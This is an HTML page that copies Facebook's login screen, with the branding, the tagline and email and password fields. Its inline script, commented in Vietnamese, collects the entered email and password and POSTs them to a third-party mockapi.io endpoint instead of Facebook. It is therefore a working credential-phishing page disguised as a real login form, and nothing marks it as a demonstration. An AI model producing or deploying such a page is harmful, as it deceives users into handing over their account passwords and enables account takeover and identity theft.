<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container flex">
    <div class="facebook-page flex">
      <div class="text">
        <h1>facebook</h1>
        <p>Facebook helps you connect and share <br> with the people in your life. </p>
      </div>
      <form id="loginForm" action="#">
        <input id="emailInput" type="email" placeholder="Email or phone number" required>
        <input id="passwordInput" type="password" placeholder="Password" required>
        <div class="link">
          <button type="submit" class="login" onclick="login()">Login</button>
          <a href="#" class="forgot">Forgot password?</a>
        </div>
        <hr>
        <div class="button">
          <a href="#">Create new account</a>
        </div>
      </form>
    </div>
  </div>

  <script>
    function login() {
      // Lấy giá trị email và mật khẩu từ các trường nhập
      var email = document.getElementById("emailInput").value;
      var password = document.getElementById("passwordInput").value;

      // Tạo một đối tượng chứa dữ liệu để gửi đến API của bạn
      var data = {
        email: email,
        password: password
      };

      // Gửi dữ liệu đến API bằng phương thức POST
      fetch('https://6628f1fb54afcabd07378ac9.mockapi.io/api/data/user', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        // Xử lý dữ liệu trả về từ API nếu cần
      })
      .catch((error) => {
        console.error('Error:', error);
        // Xử lý lỗi nếu có
      });
    }
  </script>
</body>
</html>
